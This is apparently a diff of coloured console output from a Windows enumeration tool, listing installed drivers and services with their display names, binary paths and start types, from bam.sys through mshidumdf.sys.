+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\bam.sys[0m[0m[0m,-100(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\bam.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\bam.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\bam.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(@bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[[0m[1;32mC:\Windows\System32\drivers\bcmfn2.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\bindflt.sys,-100(@%systemroot%\system32\drivers\bindflt.sys,-100)[[0m[1;32mC:\Windows\system32\drivers\bindflt.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\bindflt.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\browser.dll,-102(@%systemroot%\system32\browser.dll,-102)[[0m[1;32msystem32\DRIVERS\bowser.sys[0m] - System
+    [1;37m@%systemroot%\system32\browser.dll,-103
+[1;90m   =================================================================================================[0m
+
+    @bthhfenum.inf,%BthHFEnum.SVCDESC%;Bluetooth Hands-Free Audio and Call Control HID Enumerator(@bthhfenum.inf,%BthHFEnum.SVCDESC%;Bluetooth Hands-Free Audio and Call Control HID Enumerator)[[0m[1;32mC:\Windows\System32\drivers\bthhfenum.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mdmbtmdm.inf,%BthModem.DisplayName%;Bluetooth Modem Communications Driver(@mdmbtmdm.inf,%BthModem.DisplayName%;Bluetooth Modem Communications Driver)[[0m[1;32mC:\Windows\System32\drivers\bthmodem.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @virtdisk.inf,%service_desc%;Microsoft Hyper-V VHDPMEM BTT Filter(@virtdisk.inf,%service_desc%;Microsoft Hyper-V VHDPMEM BTT Filter)[[0m[1;32mSystem32\drivers\bttflt.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @buttonconverter.inf,%btnconv.SvcDesc%;Service for Portable Device Control devices(@buttonconverter.inf,%btnconv.SvcDesc%;Service for Portable Device Control devices)[[0m[1;32mC:\Windows\System32\drivers\buttonconverter.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ChargeArbitration.inf,%CAD_DevDesc%;Charge Arbitration Driver(@ChargeArbitration.inf,%CAD_DevDesc%;Charge Arbitration Driver)[[0m[1;32mC:\Windows\System32\drivers\CAD.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @capimg.inf,%CapImgHid_Service%;HID driver for CapImg touch screen(@capimg.inf,%CapImgHid_Service%;HID driver for CapImg touch screen)[[0m[1;32mC:\Windows\System32\drivers\capimg.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    CD/DVD File System Reader(CD/DVD File System Reader)[[0m[1;32msystem32\DRIVERS\cdfs.sys[0m] - Manual
+    [1;37mISO9660/Joliet File System Reader for CD/DVDs. (Core) (All pieces)
+[1;90m   =================================================================================================[0m
+
+    @cdrom.inf,%cdrom_ServiceDesc%;CD-ROM Driver(@cdrom.inf,%cdrom_ServiceDesc%;CD-ROM Driver)[[0m[1;32mC:\Windows\System32\drivers\cdrom.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(@cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[[0m[1;32mC:\Windows\System32\drivers\cht4vx64.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @circlass.inf,%circlass.SVCDESC%;Consumer IR Devices(@circlass.inf,%circlass.SVCDESC%;Consumer IR Devices)[[0m[1;32mC:\Windows\System32\drivers\circlass.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Windows Cloud Files Filter Driver(Windows Cloud Files Filter Driver)[[0m[1;32msystem32\drivers\cldflt.sys[0m] - Autoload
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\clfs.sys,-100(@%SystemRoot%\system32\drivers\clfs.sys,-100)[[0m[1;32mSystem32\drivers\CLFS.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\clfs.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @cmbatt.inf,%CmBatt.SvcDesc%;Microsoft ACPI Control Method Battery Driver(@cmbatt.inf,%CmBatt.SvcDesc%;Microsoft ACPI Control Method Battery Driver)[[0m[1;32mC:\Windows\System32\drivers\CmBatt.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\cnghwassist.sys,-100(@%SystemRoot%\system32\drivers\cnghwassist.sys,-100)[[0m[1;32mSystem32\DRIVERS\cnghwassist.sys[0m] - Manual
+    [1;37m@%SystemRoot%\system32\drivers\cnghwassist.sys,-100
+[1;90m   =================================================================================================[0m
+
+    Console Driver(Console Driver)[[0m[1;32mSystem32\drivers\condrv.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\cscsvc.dll,-202(@%systemroot%\system32\cscsvc.dll,-202)[[0m[1;32msystem32\drivers\csc.sys[0m] - System
+    [1;37m@%systemroot%\system32\cscsvc.dll,-203
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\dam.sys[0m[0m[0m,-100(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\dam.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\dam.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\dam.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\wkssvc.dll,-1008(@%systemroot%\system32\wkssvc.dll,-1008)[[0m[1;32mSystem32\Drivers\dfsc.sys[0m] - System
+    [1;37m@%systemroot%\system32\wkssvc.dll,-1009
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\DiagSvcs\DiagnosticsHub.StandardCollector.ServiceRes.dll,-1000(@%SystemRoot%\system32\DiagSvcs\DiagnosticsHub.StandardCollector.ServiceRes.dll,-1000)[[0m[1;32mC:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\DiagSvcs\DiagnosticsHub.StandardCollector.ServiceRes.dll,-1001
+[1;90m   =================================================================================================[0m
+
+    @disk.inf,%disk_ServiceDesc%;Disk Driver(@disk.inf,%disk_ServiceDesc%;Disk Driver)[[0m[1;32mSystem32\drivers\disk.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @wdmaudio.inf,%drmkaud.SvcDesc%;Microsoft Trusted Audio Drivers(@wdmaudio.inf,%drmkaud.SvcDesc%;Microsoft Trusted Audio Drivers)[[0m[1;32mC:\Windows\System32\drivers\drmkaud.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    LDDM Graphics Subsystem(LDDM Graphics Subsystem)[[0m[1;32mC:\Windows\System32\drivers\dxgkrnl.sys[0m] - System
+    [1;37mControls the underlying video driver stacks to provide fully-featured display capabilities.
+[1;90m   =================================================================================================[0m
+
+    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(@netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[[0m[1;32mSystem32\drivers\evbda.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\efssvc.dll,-100(@%SystemRoot%\system32\efssvc.dll,-100)[[0m[1;32mC:\Windows\System32\lsass.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\efssvc.dll,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\EhStorClass.sys,-100(@%SystemRoot%\system32\drivers\EhStorClass.sys,-100)[[0m[1;32mSystem32\drivers\EhStorClass.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\EhStorClass.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @ehstortcgdrv.inf,%EhStorTcgDrv.Desc%;Microsoft driver for storage devices supporting IEEE 1667 and TCG protocols(@ehstortcgdrv.inf,%EhStorTcgDrv.Desc%;Microsoft driver for storage devices supporting IEEE 1667 and TCG protocols)[[0m[1;32mSystem32\drivers\EhStorTcgDrv.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @errdev.inf,%ERRDEV.SvcDesc%;Microsoft Hardware Error Device Driver(@errdev.inf,%ERRDEV.SvcDesc%;Microsoft Hardware Error Device Driver)[[0m[1;32mC:\Windows\System32\drivers\errdev.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\fxsresm.dll,-118(@%systemroot%\system32\fxsresm.dll,-118)[[0m[1;32mC:\Windows\system32\fxssvc.exe[0m] - System
+    [1;37m@%systemroot%\system32\fxsresm.dll,-122
+[1;90m   =================================================================================================[0m
+
+    @fdc.inf,%fdc_ServiceDesc%;Floppy Disk Controller Driver(@fdc.inf,%fdc_ServiceDesc%;Floppy Disk Controller Driver)[[0m[1;32mC:\Windows\System32\drivers\fdc.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filecrypt.sys[0m[0m[0m,-100(@%systemroot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filecrypt.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filecrypt.sys[0m[0m[0m] - System
+    [1;37m@%systemroot%\[0m[1;32msystem32\drivers\filecrypt.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\fileinfo.sys,-100(@%SystemRoot%\system32\drivers\fileinfo.sys,-100)[[0m[1;32mSystem32\drivers\fileinfo.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\fileinfo.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filetrace.sys[0m[0m[0m,-10001(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filetrace.sys[0m[0m[0m,-10001)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\filetrace.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\filetrace.sys[0m,-10000
+[1;90m   =================================================================================================[0m
+
+    @flpydisk.inf,%floppy_ServiceDesc%;Floppy Disk Driver(@flpydisk.inf,%floppy_ServiceDesc%;Floppy Disk Driver)[[0m[1;32mC:\Windows\System32\drivers\flpydisk.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\fltmgr.sys[0m[0m[0m,-10001(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\fltmgr.sys[0m[0m[0m,-10001)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\fltmgr.sys[0m[0m[0m] - Boot
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\fltmgr.sys[0m,-10000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\fsdepends.sys,-10001(@%SystemRoot%\system32\drivers\fsdepends.sys,-10001)[[0m[1;32mSystem32\drivers\FsDepends.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\fsdepends.sys,-10000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\fvevol.sys,-100(@%SystemRoot%\system32\drivers\fvevol.sys,-100)[[0m[1;32mSystem32\DRIVERS\fvevol.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\fvevol.sys,-100
+[1;90m   =================================================================================================[0m
+
+    @wgencounter.inf,%GenCounter.SVCDESC%;Microsoft Hyper-V Generation Counter(@wgencounter.inf,%GenCounter.SVCDESC%;Microsoft Hyper-V Generation Counter)[[0m[1;32mC:\Windows\System32\drivers\vmgencounter.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @genericusbfn.inf,%genericusbfn.ServiceName%;Generic USB Function Class(@genericusbfn.inf,%genericusbfn.ServiceName%;Generic USB Function Class)[[0m[1;32mC:\Windows\System32\drivers\genericusbfn.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Microsoft GPIO Class Extension Driver(Microsoft GPIO Class Extension Driver)[[0m[1;32mSystem32\Drivers\msgpioclx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\gpuenergydrv.sys,-100(@%SystemRoot%\system32\drivers\gpuenergydrv.sys,-100)[[0m[1;32mSystem32\drivers\gpuenergydrv.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\gpuenergydrv.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @hdaudbus.inf,%HDAudBus.SVCDESC%;Microsoft UAA Bus Driver for High Definition Audio(@hdaudbus.inf,%HDAudBus.SVCDESC%;Microsoft UAA Bus Driver for High Definition Audio)[[0m[1;32mC:\Windows\System32\drivers\HDAudBus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @hidbatt.inf,%HidBatt.SvcDesc%;HID UPS Battery Driver(@hidbatt.inf,%HidBatt.SvcDesc%;HID UPS Battery Driver)[[0m[1;32mC:\Windows\System32\drivers\HidBatt.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @hidbth.inf,%HIDBTH.SvcDesc%;Microsoft Bluetooth HID Miniport(@hidbth.inf,%HIDBTH.SvcDesc%;Microsoft Bluetooth HID Miniport)[[0m[1;32mC:\Windows\System32\drivers\hidbth.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @hidi2c.inf,%hidi2c.SVCDESC%;Microsoft I2C HID Miniport Driver(@hidi2c.inf,%hidi2c.SVCDESC%;Microsoft I2C HID Miniport Driver)[[0m[1;32mC:\Windows\System32\drivers\hidi2c.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @hidinterrupt.inf,%HID_Interrupt.SvcDesc%;Common Driver for HID Buttons implemented with interrupts(@hidinterrupt.inf,%HID_Interrupt.SvcDesc%;Common Driver for HID Buttons implemented with interrupts)[[0m[1;32mC:\Windows\System32\drivers\hidinterrupt.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @hidir.inf,%HIDIR.SvcDesc%;Microsoft Infrared HID Driver(@hidir.inf,%HIDIR.SvcDesc%;Microsoft Infrared HID Driver)[[0m[1;32mC:\Windows\System32\drivers\hidir.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @input.inf,%HID.SvcDesc%;Microsoft HID Class Driver(@input.inf,%HID.SvcDesc%;Microsoft HID Class Driver)[[0m[1;32mC:\Windows\System32\drivers\hidusb.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\http.sys,-1(@%SystemRoot%\system32\drivers\http.sys,-1)[[0m[1;32msystem32\drivers\HTTP.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\http.sys,-2
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\hvservice.sys[0m[0m[0m,-16(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\hvservice.sys[0m[0m[0m,-16)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\hvservice.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\hvservice.sys[0m,-17
+[1;90m   =================================================================================================[0m
+
+    Microsoft Hardware Notifications Class Extension Driver(Microsoft Hardware Notifications Class Extension Driver)[[0m[1;32mSystem32\Drivers\mshwnclx.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\hwpolicy.sys,-101(@%systemroot%\system32\drivers\hwpolicy.sys,-101)[[0m[1;32mSystem32\drivers\hwpolicy.sys[0m] - Boot
+    [1;37m@%systemroot%\system32\drivers\hwpolicy.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @msmouse.inf,%i8042prt.SvcDesc%;PS/2 Keyboard and Mouse Port Driver(@msmouse.inf,%i8042prt.SvcDesc%;PS/2 Keyboard and Mouse Port Driver)[[0m[1;32mC:\Windows\System32\drivers\i8042prt.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver(@iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver)[[0m[1;32mC:\Windows\System32\drivers\iagpio.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller(@iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller)[[0m[1;32mC:\Windows\System32\drivers\iai2c.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(@iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[[0m[1;32mC:\Windows\System32\drivers\iaLPSS2i_GPIO2.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(@iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[[0m[1;32mC:\Windows\System32\drivers\iaLPSS2i_GPIO2_BXT_P.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2(@iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[[0m[1;32mC:\Windows\System32\drivers\iaLPSS2i_I2C.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2(@iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[[0m[1;32mC:\Windows\System32\drivers\iaLPSS2i_I2C_BXT_P.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(@ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[[0m[1;32mC:\Windows\System32\drivers\iaLPSSi_GPIO.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(@ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[[0m[1;32mC:\Windows\System32\drivers\iaLPSSi_I2C.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(@iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[[0m[1;32mSystem32\drivers\iaStorAVC.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(@iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[[0m[1;32mSystem32\drivers\iaStorV.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(@mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[[0m[1;32mC:\Windows\System32\drivers\ibbus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\IndirectKmd.sys,-100(@%SystemRoot%\system32\drivers\IndirectKmd.sys,-100)[[0m[1;32mC:\Windows\System32\drivers\IndirectKmd.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\IndirectKmd.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @intelpep.inf,%INTELPEP.SVCDESC%;Intel(R) Power Engine Plug-in Driver(@intelpep.inf,%INTELPEP.SVCDESC%;Intel(R) Power Engine Plug-in Driver)[[0m[1;32mSystem32\drivers\intelpep.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @cpu.inf,%IntelPPM.SvcDesc%;Intel Processor Driver(@cpu.inf,%IntelPPM.SvcDesc%;Intel Processor Driver)[[0m[1;32mC:\Windows\System32\drivers\intelppm.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\iorate.sys[0m[0m[0m,-101(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\iorate.sys[0m[0m[0m,-101)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\iorate.sys[0m[0m[0m] - Boot
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\iorate.sys[0m,-102
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32013(@%systemroot%\system32\mprmsg.dll,-32013)[[0m[1;32msystem32\DRIVERS\ipfltdrv.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32013
+[1;90m   =================================================================================================[0m
+
+    IP Network Address Translator(IP Network Address Translator)[[0m[1;32mSystem32\drivers\ipnat.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    IrDA(IrDA)[[0m[1;32mC:\Windows\system32\drivers\irda.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\irenum.sys[0m[0m[0m,-100(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\irenum.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\irenum.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\irenum.sys[0m,-101
+[1;90m   =================================================================================================[0m
+
+    @iscsi.inf,%iScsiPortName%;iScsiPort Driver(@iscsi.inf,%iScsiPortName%;iScsiPort Driver)[[0m[1;32mC:\Windows\System32\drivers\msiscsi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @keyboard.inf,%kbdclass.SvcDesc%;Keyboard Class Driver(@keyboard.inf,%kbdclass.SvcDesc%;Keyboard Class Driver)[[0m[1;32mC:\Windows\System32\drivers\kbdclass.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @keyboard.inf,%KBDHID.SvcDesc%;Keyboard HID Driver(@keyboard.inf,%KBDHID.SvcDesc%;Keyboard HID Driver)[[0m[1;32mC:\Windows\System32\drivers\kbdhid.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @kdnic.inf,%KdNic.Service.DispName%;Microsoft Kernel Debug Network Miniport (NDIS 6.20)(@kdnic.inf,%KdNic.Service.DispName%;Microsoft Kernel Debug Network Miniport (NDIS 6.20))[[0m[1;32mC:\Windows\System32\drivers\kdnic.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @keyiso.dll,-100(@keyiso.dll,-100)[[0m[1;32mC:\Windows\system32\lsass.exe[0m] - System
+    [1;37m@keyiso.dll,-101
+[1;90m   =================================================================================================[0m
+
+    Kernel Streaming Thunks(Kernel Streaming Thunks)[[0m[1;32mC:\Windows\system32\drivers\ksthunk.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\lltdres.dll,-6(@%SystemRoot%\system32\lltdres.dll,-6)[[0m[1;32msystem32\drivers\lltdio.sys[0m] - Autoload
+    [1;37m@%SystemRoot%\system32\lltdres.dll,-6
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\luafv.sys,-100(@%systemroot%\system32\drivers\luafv.sys,-100)[[0m[1;32mC:\Windows\system32\drivers\luafv.sys[0m] - Autoload
+    [1;37m@%systemroot%\system32\drivers\luafv.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @mausbhost.inf,%MAUSBHost.ServiceName%;MA-USB Host Controller Driver(@mausbhost.inf,%MAUSBHost.ServiceName%;MA-USB Host Controller Driver)[[0m[1;32mC:\Windows\System32\drivers\mausbhost.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mausbhost.inf,%MAUSBIP.ServiceName%;MA-USB IP Filter Driver(@mausbhost.inf,%MAUSBIP.ServiceName%;MA-USB IP Filter Driver)[[0m[1;32mC:\Windows\System32\drivers\mausbip.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(@mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[[0m[1;32mC:\Windows\System32\drivers\mlx4_bus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\mmcss.sys,-100(@%systemroot%\system32\drivers\mmcss.sys,-100)[[0m[1;32mC:\Windows\system32\drivers\mmcss.sys[0m] - Autoload
+    [1;37m@%systemroot%\system32\drivers\mmcss.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @monitor.inf,%Monitor.SVCDESC%;Microsoft Monitor Class Function Driver Service(@monitor.inf,%Monitor.SVCDESC%;Microsoft Monitor Class Function Driver Service)[[0m[1;32mC:\Windows\System32\drivers\monitor.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msmouse.inf,%mouclass.SvcDesc%;Mouse Class Driver(@msmouse.inf,%mouclass.SvcDesc%;Mouse Class Driver)[[0m[1;32mC:\Windows\System32\drivers\mouclass.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @msmouse.inf,%MOUHID.SvcDesc%;Mouse HID Driver(@msmouse.inf,%MOUHID.SvcDesc%;Mouse HID Driver)[[0m[1;32mC:\Windows\System32\drivers\mouhid.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\mountmgr.sys,-100(@%SystemRoot%\system32\drivers\mountmgr.sys,-100)[[0m[1;32mSystem32\drivers\mountmgr.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\mountmgr.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\mpsdrv.sys,-23092(@%SystemRoot%\system32\drivers\mpsdrv.sys,-23092)[[0m[1;32mSystem32\drivers\mpsdrv.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\mpsdrv.sys,-23093
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\webclnt.dll,-104(@%systemroot%\system32\webclnt.dll,-104)[[0m[1;32mC:\Windows\system32\drivers\mrxdav.sys[0m] - System
+    [1;37m@%systemroot%\system32\webclnt.dll,-105
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\wkssvc.dll,-1002(@%systemroot%\system32\wkssvc.dll,-1002)[[0m[1;32msystem32\DRIVERS\mrxsmb.sys[0m] - System
+    [1;37m@%systemroot%\system32\wkssvc.dll,-1003
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\wkssvc.dll,-1006(@%systemroot%\system32\wkssvc.dll,-1006)[[0m[1;32msystem32\DRIVERS\mrxsmb20.sys[0m] - System
+    [1;37m@%systemroot%\system32\wkssvc.dll,-1007
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\bridgeres.dll,-1(@%SystemRoot%\system32\bridgeres.dll,-1)[[0m[1;32mSystem32\drivers\bridge.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\bridgeres.dll,-1
+[1;90m   =================================================================================================[0m
+
+    @comres.dll,-2797(@comres.dll,-2797)[[0m[1;32mC:\Windows\System32\msdtc.exe[0m] - System
+    [1;37m@comres.dll,-2798
+[1;90m   =================================================================================================[0m
+
+    @msgpiowin32.inf,%GPIO.SvcDesc%;Common Driver for Buttons, DockMode and Laptop/Slate Indicator(@msgpiowin32.inf,%GPIO.SvcDesc%;Common Driver for Buttons, DockMode and Laptop/Slate Indicator)[[0m[1;32mC:\Windows\System32\drivers\msgpiowin32.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\mshidkmdf.sys,-100(@%SystemRoot%\system32\drivers\mshidkmdf.sys,-100)[[0m[1;32mC:\Windows\System32\drivers\mshidkmdf.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\mshidkmdf.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\mshidumdf.sys,-100(@%SystemRoot%\system32\drivers\mshidumdf.sys,-100)[[0m[1;32mC:\Windows\System32\drivers\mshidumdf.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\mshidumdf.sys,-101
+[1;90m   =================================================================================================[0m
+
